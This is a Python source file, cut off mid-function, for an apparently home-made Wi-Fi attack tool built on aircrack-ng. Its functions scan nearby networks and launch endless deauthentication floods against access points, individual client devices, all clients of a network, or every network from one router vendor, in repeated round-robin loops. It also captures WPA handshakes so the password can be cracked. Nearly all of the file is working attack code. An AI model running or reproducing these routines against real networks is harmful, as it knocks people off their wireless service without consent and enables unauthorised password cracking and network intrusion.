import os
import signal
import subprocess
import time
import re
import keyboard
import glob

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']


def clear():
    """
    runs clear command in shell

    clear command is used to clear the terminal screen
    """
    subprocess.run('clear')


def ansi_escape_red(string):
    """
    inputs a string and returns it with the color red

    use when in need for errors during print commands

    param string
    """
    return f'\033[91m{string}\033[0m'


def ansi_escape_green(string):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    param string
    """
    return f'\033[92m{string}\033[0m'


def output_ansi_management(output):
    """
    This function processes the raw output from airodump to extract only the most recent network information
    displayed on the terminal.

        Airodump updates the terminal view with new data by using ANSI escape codes, effectively refreshing the
        screen. Before each refresh, it uses a specific pattern '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' to clear
        the previous information, and this function uses this pattern to identify and retain only the latest data.
        Similarly, the end of the standard output is marked by another pattern '\x1b[0K\n\x1b[0J\x1b[?25h',
        which this function removes.

        Basically

        when I save the output from airodump using subprocess.Popen(..., stdout=subprocess.PIPE) and output =
        airodump.communicate() the output has all the information from airodump at second = 0 up to seconds = 10
        where I kill the process

        what we see on screen is an illusion of old text being deleted and new one being
        written to screen, but it's all done with ansi escape

        you can examine this with print(repr(output)), just printing the output with print(output) would look
        normal since terminal understands the ansi and hides the information beyond this pattern
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'

        everything is fine when printing but this becomes a problem when I want to deal with the output variable like
        managing the data inside. that's why I only want the latest information visible to us on terminal screen

        '\x1b[0K\n\x1b[0J\x1b[?25h' this is the pattern at the end of the output file from and this
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' is the start pattern for each new airodump refresh

        so if I get the all the data starting from latest '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' up to
        '\x1b[0K\n\x1b[0J\x1b[?25h' it will return only the latest airodump refresh with no duplicates

        BUT THIS PATTERN ONLY APPLIES TO THE OUTPUT FILE RETRIEVED FROM get_airodump_output()

        and if we are dealing with output file retrieved from get_devices_in_AP_output() (a different output file
        from get_airodump_output())  the end pattern becomes '\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' if no devices
        exist, pattern changes too I made an end+start pattern format for possible scenarios



        Parameters:
        - output (str): The raw output from airodump.

        Returns:
        str: The processed output containing only the latest network information visible on the terminal.
    """

    # this is the end pattern for output files generated by get_airodump_output()
    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:
        # this is the start pattern for output files generated by get_airodump_output()
        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'  # end sequence of output file from get_airodump_output()
            end_index = output.rfind(end_pattern)  # if it fails to find it will return -1
            start_index = output.rfind(start_pattern, 0, end_index)  # if it fails to find it will return -1
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 1')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data

    if 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' in output:  # end sequence of output file from get_devices_in_AP_output() when A STATION DOES NOT EXIST IN THE OUTPUT / A device is NOT connected to that SSID
        if '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m' in output:  # this is the start pattern for output files generated by get_devices_in_AP_output() when A STATION DOES NOT EXIST IN THE OUTPUT / A device is NOT connected to that SSID
            start_pattern = '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m'
            end_pattern = 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)  # if it fails to find it will return -1
            start_index = output.rfind(start_pattern, 0, end_index)  # if it fails to find it will return -1
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 2')
                return
            else:
                return None  # this None will be checkd in deauth_devices_in_targetAP() to see if the return is None or not to throw an error and inform user that no device is in the output

    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:  # this is the end pattern for output files generated by get_airodump_output()
        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:  # this is the start pattern for output files generated by get_airodump_output()
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'  # end sequence of output file from get_airodump_output()
            end_index = output.rfind(end_pattern)  # if it fails to find it will return -1
            start_index = output.rfind(start_pattern, 0, end_index)  # if it fails to find it will return -1
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 3')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data


def get_ALL_SSID_from_output(output):
    # output contains all the latest data of the airodump-ng to show only the network names
    output = output_ansi_management(output)

    SSIDS = []
    try:
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                SSIDS.append(column[10])
        return SSIDS
    except AttributeError:
        print("There was a problem managing the output file. try again")
        print(AttributeError)
        return


def scan_for_networks(interface):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    :param interface: user selected interface from the main.py

    CALLS: 0

    CALLED BY: main.py

    Depends on (uses) :
        - get_airodump_output(interface)

    """
    output = get_airodump_output(interface)
    SSIDS = get_ALL_SSID_from_output(output)
    for ssid in SSIDS:
        print(ssid)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():

        print('==================================================================================================\n')
        while 1:
            targetAP = input(' Select a AP (SSID/ESSID) : ').strip()
            if targetAP in SSIDS:
                return targetAP
            if targetAP == '999':
                return
            else:
                print(f'Selected AP ({ansi_escape_green(targetAP)}) does not exist. was it a mistype?')
                print(f'Type {ansi_escape_green("999")} to cancel AP selection')
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_for_networks")}')
        print(f'There is a problem with {ansi_escape_red("get_airodump_output")}')
        print(ansi_escape_red(output))
        input(f'input anything to return to previous function \n')


def get_BSSID_and_Station_from_AP(interface, targetAP):
    """
    Runs airodump and saves the output to a variable called output.

    :param interface: is selected by user in main.py and used in airodump

    :param targetAP: is used through the output of airodump to match the BSSID and STATION
    :type targetAP: String

    :return:  BSSID and STATION
    :rtype: String

    CALLS: itself,

    CALLED BY: itself,

    """

    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_BSSID_and_Station_from_AP(interface, targetAP)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_BSSID_and_Station_from_AP")} No {ansi_escape_red("BSSID")} and {ansi_escape_red("CHANNEL")} will be returned this may cause issues if this function was called from another function \n')
                return  # this return is not enough on its own because when recursion is used return will return to the parent of that recursive function
                # so if we input 'Y' for 10 times we would need to input 'N' 10 times to actually return to the first function call
            else:
                recursion()
            return  # that's why we have a return here so that it returns to the first function call

    # save the output and error from airodump to variables
    clear()
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # kill airodump after 10 seconds
    time.sleep(15)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    airodump.wait()

    # .communicate() waits for the process to be completed. so it won't run until 'os.killpg(airodump.pid, signal.SIGKILL)' is successful.
    output, error = airodump.communicate()

    if isinstance(output, bytes):
        # there was an issue with the output and error, when ---> output = output.decode(encoding='utf-8') it gives ---> UnicodeDecodeError, invalid continuation byte
        # the solution is changing the encoding from 'utf-8' to 'latin-1'
        output = output.decode(encoding='latin-1')
    else:
        print('there was a issue running Airodump, check interface. if everything is okay rerun')
        recursion()

    print(output)
    print('==================================================================================================\n')

    # check if airodump found the target AP or not
    if targetAP not in output:
        # IF AN ERROR CAUSED TARGET AP TO BE NOT FOUND IN THE AIRODUMP DATA THEN THIS WILL RUN (example: interface not found)
        if isinstance(error, bytes):
            error = error.decode(encoding='latin-1')
            if error:
                print(
                    f' There was an error with the airodump-ng. If you see networks listed above then there is no serious issue. Otherwise check the interface and the error')
                print(
                    f' Generally If you are seeing this then its a issue with the interface either its disconnected or you given a wrong name for the interface \n')
                # TODO do not allow selecting interfaces that are not on the output of ip link show
                print(f'ERROR: {ansi_escape_red(error)}')

        # IF NO ERRORS OCCURRED AND NETWORK SCAN WAS SUCCESSFUL BUT TARGET AP WAS NOT ON THE SCANNED NETWORK LIST THEN THIS WILL RUN
        print('==================================================================================================\n')
        print(f'{ansi_escape_green(targetAP)} was not found in scanned networks \n')
        print('But If you are seeing the networks then check connectivity of AP \n')
        recursion()
    # if airodump was successful in finding the targetAP
    else:

        # with split.('\n') make the output format in to lines/rows
        # this for loop will check each line going down
        for row in output.split('\n'):
            column = row.split()
            # the use of row.split() places comma ',' instead of all empty space
            # the column looks like this for nearly all APs when using airodump
            # ['BSSID', 'PWR', 'BEACONS', 'DATA', '/s', 'CHANNEL', '360', 'ENCRYPTION', 'CIPHER', 'AUTH', 'ESSID', '\x1b[0K']
            # but airodump records contain other things as well, so first we need to be sure it matches this pattern
            if len(column) >= 12 and (targetAP == column[10]) and ((column[0] and column[5]) != ''):
                targetAP_BSSID = column[0]
                targetAP_channel = column[5]
                print(
                    f' Target BSSID {ansi_escape_green(targetAP_BSSID)} \n CHANNEL {ansi_escape_green(targetAP_channel)}  \n AP {ansi_escape_green(targetAP)} \n \n Listing '
                    f'Devices in this AP Please Wait')
                return targetAP_BSSID, targetAP_channel
    return


def Deauth(interface, targetAP, interval=0, timeLimit=0):
    """
    CALLS:
        : get_BSSID_and_Station_from_AP :


    CALLED BY: main.py


    :param interface: Wi-Fi interface used in aircrack
    :type interface: string
    :param targetAP:


    :param interval: by default aireplay runs until user closes it. if interval != 0 then it will run for interval seconds then quit
    this option is needed for functions that loop multiple SSIDs in order to Deauth them all (for example : Deauth_By_OUI)
    for example if interval == 30. and 2 SSID exist and user wants to deauth both and quit each SSID will be deauthed for 30 seconds
    :type interval: integer

    :param timeLimit: by default aireplay runs until user closes it. or if interval time is up. but for limiting the
    Deauthentication from infinite to a limited time for a single SSID, this parameter is used
    for example if user gives DEAUTH(interface,targetAP,timeLimit=15) the deauth will run for 15 seconds

    :type timeLimit: integer
    :return:
    """
    try:
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        # switch to target channel
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()

        if interval:  # if another function wants to run deauth attack but for a limited time
            # if its 0 then it means false
            for terminal in terminals:  # run aireplay in separate terminal
                clear()
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True, preexec_fn=os.setsid)
                interval_time = interval
                while interval_time > 0:
                    print(
                        f"Deauthenticating {ansi_escape_green(targetAP)}. Remaining time {ansi_escape_green(interval_time)} Press Q repeatedly to cancel")
                    if keyboard.is_pressed('q'):
                        print("Loop canceled by user.")
                        interval_time = 1
                    time.sleep(1)
                    interval_time -= 1
                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)  # kill the aireplay and return after 60 seconds
                    aireplay.wait()

                except ProcessLookupError:  # sometimes aireplay gets killed randomly with this try catch once we get an error while trying to kill a process that's already killed the script will still continue to run
                    print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {ansi_escape_red(ProcessLookupError)}")
                return

        elif timeLimit:  # if time limit is given then run airodump and terminate after timeLimit ends
            for terminal in terminals:
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True, preexec_fn=os.setsid)
                time.sleep(timeLimit)
                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)  # kill the aireplay and return after 60 seconds
                    aireplay.wait()

                except ProcessLookupError:  # sometimes aireplay gets killed randomly with this try catch once we get an error while trying to kill a process that's already killed the script will still continue to run
                    print(
                        f"This error occurs when airodump terminates unexpectedly {ansi_escape_red(ProcessLookupError)}")
                return

        else:
            for terminal in terminals:
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True)
                aireplay.wait()  # wait until user closes the aireplay terminal
                return

    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("Deauth")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def get_devices_in_AP_output(interface, targetAP):
    """

    runs airodump with :param interface: on a specific SSID (:param targetAP:) to get all devices connected to that SSID

    CALLS: 0

    CALLED BY:
        :scan_devices_in_AP_Select_Device:
        :deauth_devices_in_targetAP:
    :return: OUTPUT of airodump
    """
    try:
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',
                                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(15)
        clear()
        os.killpg(airodump.pid, signal.SIGTERM)
        airodump.wait()
        output, error = airodump.communicate()
        if isinstance(output, bytes):
            clear()
            output = output.decode(encoding='latin-1')
            # print(output + '\n')
            # output = output_ansi_management(output)
            return output
    except TypeError:  # CANT CHECK /if (targetAP_BSSID and targetAP_channel) == None/ PYTHON DOES NOT ALLOW MULTIPLE VARIABLE ASSIGNMENTS WITH NONE
        # basically a,b = None is not something that can be done that's why im using try expect. if else throws error
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def scan_devices_in_AP_Select_Device(interface, targetAP):
    """
    :param interface:
    :param targetAP:
    :return:
    """
    # run scan_devices_in_AP(interface,targetAP) to get output of airodump on target AP

    output = get_devices_in_AP_output(interface, targetAP)
    if not output:  # in this scenario I expect output to be None and None == false so...
        # also I don't have to use try except TypeError: like I did in scan_devices_in_AP because that error only comes from multiple assignment
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP_Select_Device")}')
        print(f'There is a problem with {ansi_escape_red("scan_devices_in_AP")}')
        input('input anything to return to previous function \n')
        return ''
    else:
        clear()
        print(output, '\n')
        target_device = input('type the Station of the target device : ')

        def check_if_selected_device_exist(target_device, output):  # recursion once again :)
            if target_device in output and target_device != '':
                return target_device
            else:
                print(f'{target_device} is not in the devices of this AP. Was it a mistype?')
                target_device = input('Retype the Station (type 999 to return to previous section: ')
                if target_device == '999':
                    return ''
                else:
                    check_if_selected_device_exist(target_device, output)

        check_if_selected_device_exist(target_device, output)
        return ''


def deauth_selected_device(interface, target_device, targetAP):
    try:
        global terminals
        # get bssid and channel;
        targetAP_BSSID, targetAP_channel = get_BSSID_and_Station_from_AP(interface, targetAP)
        # switch to target channel
        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()

        # run aireplay in separate terminal
        for terminal in terminals:
            aireplay = subprocess.Popen(
                f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} -c {target_device} {interface}', shell=True)
            aireplay.wait()  # ctrl+c on new terminal (or just closing it) will put the system to this place and then with return it will return to NetworkAttacks menu
            return
    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_selected_device")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def get_airodump_output(interface):
    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output(interface)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output")} No {ansi_escape_red("Output")} will be returned this may cause issues if this function was called from another function \n')
                return
            else:
                recursion()
            return

    clear()
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(15)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    airodump.wait()

    output, error = airodump.communicate()
    if isinstance(output, bytes):
        output = output.decode(encoding='latin-1')
        if ('Failed initializing wireless card(s)'.lower() in output.lower()):
            print(f'INTERFACE ERROR {ansi_escape_red(output)}')
            recursion()
        else:
            # output = output_ansi_management(output)
            return output
    else:
        error.decode(encoding='latin-1')
        print(
            f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(error)}')
        recursion()


def get_airodump_output_OUI_formatted(interface):
    """
    th

    param interface
    """

    def recursion():
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_OUI_formatted(interface)
            elif selection == 'n':
                print(
                    '==================================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output_OUI_formatted")} No {ansi_escape_red("OUI_output")} will be returned this may cause issues if this function was called from another function \n')
                return
            else:
                recursion()
            return

    clear()
    print("OUIFormatter.sh is running. wait until it completes the scan (20s) ")
    # so it turns out I can just do capture_output=True,text=True and get an output without bytes
    shell = subprocess.run(f'./ShellScripts/OUIFormatter.sh {interface}', shell=True, capture_output=True, text=True)
    oui_output, oui_output_error = shell.stdout, shell.stderr
    clear()
    if ('Failed initializing wireless card(s)'.lower() in oui_output.lower()):
        print(f'INTERFACE ERROR {ansi_escape_red(oui_output)}')
        recursion()
    if oui_output_error:
        print(
            f'there was a issue running {ansi_escape_red("OUIFormatter.sh")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(oui_output_error)}')

        print(oui_output)
        print(
            'an error occurred but If you see networks above then there is no problem (check above before the networks to see the error)')
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_OUI_formatted(interface)
            elif selection == 'n':
                return oui_output
    else:
        return oui_output


def scan_for_networks_by_OUI_Select_Router(interface):
    oui_output = get_airodump_output_OUI_formatted(interface)  # as usual get the output first
    print(oui_output)
    print('==================================================================================================\n')
    while 1:
        target_oui = input("Select an OUI from the output").replace(" ",
                                                                    "")  # so that if user types 'XX:XX:XX   ' instead of 'XX:XX;XX' it still gets registered
        if target_oui in oui_output and len(
                target_oui) == 8:  # the OUI length is 8 (XX:XX:XX) so if its in output and length is 8 then any mistypes like emtpy space or anything that exist in output but not a mac address wil not be registered
            # however if a Wi-Fi has a SSID like 12345678 and user types 12345678 it will be a FALSE POSITIVE so nothing to do about that.
            # I may add a format to check too, but it's not necessary since if a user picks a wrong OUI it won't be useful in deauth_by_OUI attack and user would have to choose the target OUI again.
            return target_oui
        elif target_oui == '999':
            return
        else:
            print(len(target_oui))
            print(f'Selected OUI ({ansi_escape_green(target_oui)}) does not exist. was it a mistype?')
            print(f'Type {ansi_escape_green("999")} to cancel OUI selection')


def remove_ansi_escape_codes(input_text):
    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
    return ansi_escape.sub('', input_text)


def get_SSID_from_OUI(output, targetOUI):
    ssids = []
    lines = output.split('\n')
    current_oui = None  # Initialize current_oui outside the loop
    for line in lines:  # f the selected oui is in the last element of the output list it will add ?25 to the list no idea why
        if line.startswith("OUI:"):
            current_oui = line.split()[1]
        elif current_oui == targetOUI and "{" in line:
            ssid_start_index = line.find("{") + 1
            ssid_end_index = line.find("}", ssid_start_index)  # Find ']' starting from ssid_start_index
            ssid = line[ssid_start_index:ssid_end_index].strip()
            if ssid:  # Check if ssid is not an empty string
                ssids.append(ssid)
    return [ssid for ssid in ssids if ssid]  # Exclude any empty elements


def Deauth_By_OUI(interface, targetOUI):
    oui_output = get_airodump_output_OUI_formatted(interface)
    oui_output = remove_ansi_escape_codes(oui_output)
    SSIDs_in_oui_output = get_SSID_from_OUI(oui_output, targetOUI)
    if SSIDs_in_oui_output:
        print(f"List of SSIDs in {targetOUI}")
        for SSID in SSIDs_in_oui_output:
            print(f"{ansi_escape_green(SSID)}")
        print("=====================================",
              " 1   : Deauth all SSIDs once and quit",
              " 2   : Deauth all SSIDs roundrobin",
              " 999 : Quit")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for SSID in SSIDs_in_oui_output:
                    Deauth(interface, SSID, interval=True)
                return
            elif selection == '2':
                rr_counter = 0
                while 1:
                    for SSID in SSIDs_in_oui_output:
                        clear()
                        print(f"Deauthing {SSID}")
                        Deauth(interface, SSID, interval=True)
                    rr_counter += 1
                    print(
                        f"each SSID in {ansi_escape_green(targetOUI)} has been Deauthenticated for {ansi_escape_green(rr_counter)} times")
                    print(
                        f"moving to round {ansi_escape_green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel the loop")
                    if keyboard.is_pressed('q'):
                        print("Loop canceled by user.")
                        return
                    time.sleep(3)
    else:
        print(f"No SSID found in f{targetOUI}")
    return


def deauth_devices_in_targetAP(interface, targetAP):
    output = get_devices_in_AP_output(interface, targetAP)
    print(output)
    output = output_ansi_management(output)  # remove duplicates from output
    if output is None:
        # print(repr(output))
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it appears there are no devices connected to {ansi_escape_green(targetAP)}')
        print(
            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("output_ansi_management")}')
        print(
            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code and check the ansi escape output and check if a start/end pattern exist in  {ansi_escape_red("output_ansi_management")}')
        print(f'and contact me on {ansi_escape_green("github")}')
        input(f'input anything to return to previous function \n')
        return

    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        devices = []

        for column in output.split('\n'):
            row = column.split()
            ''' AT THIS POINT the Data is formatted like this 
               ['\x1b[0K']                                                                                                                                                                                                                                 
               ['\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '3', '][', 'Elapsed:', '6', 's', '][', '2024-02-29', '19:08', '\x1b[0K']                                                                                                                         
               ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'RXQ', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']                                                                                                                  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', '-28', '100', '55', '3', '0', '3', '360', 'WPA2', 'CCMP', 'PSK', '{targetAP}', '\x1b[0K']                                                                                               
               ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']                                                                                                                                           
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(1) in target AP}', 'X', 'X', 'X', 'X','X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(2) in target AP}', 'X', 'X', 'X', 'X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(3) in target AP}', 'X', 'X', 'X', 'X','X','X'] maximum of 9 elements in a given row
               
               mac address is 17 chars long and in 2nd index of the row  
               
            '''
            if len(row) >= 3 and len(row[2]) == 17:
                devices.append(row[2])

        if devices:
            print(
                f'{ansi_escape_green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {ansi_escape_green(targetAP)}')
            for device in devices:
                print(ansi_escape_green(device))
            print("=====================================",
                  " 1   : Deauth all devices once and quit",
                  " 2   : Deauth all devices roundrobin",
                  " 999 : Quit")
            while 1:
                selection = input("Choose an option : ")
                if selection == '999':
                    return
                elif selection == '1':
                    for device in devices:
                        deauth_selected_device(interface, device, targetAP)
                    return
                elif selection == '2':
                    rr_counter = 0
                    while 1:
                        for device in devices:
                            clear()
                            print(f"Deauthing {device}")
                            deauth_selected_device(interface, device, targetAP)
                        rr_counter += 1
                        print(
                            f"each SSID in {ansi_escape_green(device)} has been Deauthenticated for {ansi_escape_green(rr_counter)} times")
                        print(
                            f"moving to round {ansi_escape_green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel the loop")
                        if keyboard.is_pressed('q'):
                            print("Loop canceled by user.")
                            return
                        time.sleep(3)
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def get_SSIDs_with_PSK_authentication_from_output(output):
    """
    can only be used with the output variable returned from get_airodump_output()
    :param output: variable returned from get_airodump_output()
    :return: list of SSIDs where authentication is 'PSK'
    """
    output = output_ansi_management(output)
    authentications = []
    for column in output.split('\n'):
        row = column.split()
        ''' AT THIS POINT the Data is formatted like this                                                                                                                
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
                                                                            
        '''
        if len(row) >= 12 and row[-3] == ('PSK' or 'psk'):
            authentications.append(row[-2])
    return authentications


def remove_files_with_prefix(directory, prefix):
    # Construct the search pattern
    pattern = os.path.join(directory, prefix + '*')

    # Find all files in the specified directory that match the pattern
    files_to_remove = glob.glob(pattern)

    # Remove each file
    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f"Removed {file_path}")
        except FileNotFoundError:
            print(f"File {file_path} was not found (it may have been removed already).")
        except Exception as e:
            print(f"Error removing {file_path}: {e}")
    return


def get_bssid_channel_from_airodump_output(output,target_ap):
    return
def capture_handshake(interface, target_ap):
    """
    https://www.aircrack-ng.org/doku.php?id=cracking_wpa

    :param interface:
    :param target_ap:
    :return:
    """
    # capturing the handshake is done in order to crack the password of the Wi-Fi,
    # but it only works for 'psk' authentication, so we need to check if first
    output = get_airodump_output(interface)
    if output is None:
        # print(repr(output))
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
        print(
            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("output_ansi_management")}')
        print(
            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code and check the ansi escape output and check if a start/end pattern exist in  {ansi_escape_red("output_ansi_management")}')
        print(f'and contact me on {ansi_escape_green("github")}')
        input(f'input anything to return to previous function \n')
        return

    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        authentications = get_SSIDs_with_PSK_authentication_from_output(output)
        if target_ap in authentications:
            BSSID, CHANNEL = get_BSSID_and_Station_from_AP(interface, target_ap)
            # BSSID, CHANNEL = get_bssid_channel_from_airodump_output(output,target_ap) #TODO implement this to make the function faster
            for terminal in terminals:  # run aireplay in separate terminal
                clear()
                print(f'Running package capture on {ansi_escape_green(target_ap)}')
                print(
                    f'Switching channel on  {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
                switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
                switch_channel.wait()
                print(f'Running aireplay on new terminal {ansi_escape_green(target_ap)}')

                print(f'Running airodump on this terminal {ansi_escape_green(target_ap)}')
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {BSSID} {interface}', shell=True,
                                            preexec_fn=os.setsid)
                airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w /tmp/{target_ap} {interface}',
                                            shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)

                time.sleep(30)  # usually enough to get the handshake. but if you are unable to get the handshake set
                # sleep to 60 seconds

                os.killpg(airodump.pid, signal.SIGTERM)

                airodump_output = ''
                try:
                    airodump_output, error = airodump.communicate()
                    airodump_output = airodump_output.decode(encoding='latin-1')
                    airodump.wait()
                except ProcessLookupError:
                    print('airodump killed unexpectedly', ProcessLookupError)

                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)
                    aireplay.wait()
                except ProcessLookupError:
                    print('aireplay killed unexpectedly', ProcessLookupError)

                # Regular expression pattern to search for 'handshake:' possibly surrounded by ANSI escape codes
                pattern = re.compile(r'handshake:')

                # Search using the regular expression
                match = pattern.search(airodump_output)
                if match:
                    clear()
                    print(f"\nHandshake capture {ansi_escape_green('SUCCESSFUL')}")
                    print(f"Handshake is saved in ")

                else:
                    clear()
                    print(f'Handshake capture {ansi_escape_red("FAILED")}')
                    print('Remember that in order to capture the handshake a device must try to connect to the target SSID')
                    print('Reason for no handshake might be that no device was deauthenticated. Try changing the timeout variable of this script in the source code')
                    print('Or it might be that the deauthenticated devices did not try to reconnect to the SSID (might happen if only a small amount of devices are connected to target SSID)')
                    remove_files_with_prefix('/tmp', f'{target_ap}')
                    while 1:
                        selection = input('\n Do you want to try again Y/N').lower()
                        if selection == 'y':
                            capture_handshake(interface, target_ap)
                        if selection == 'n':
                            return
                return

        else:
            print(authentications)
            print(
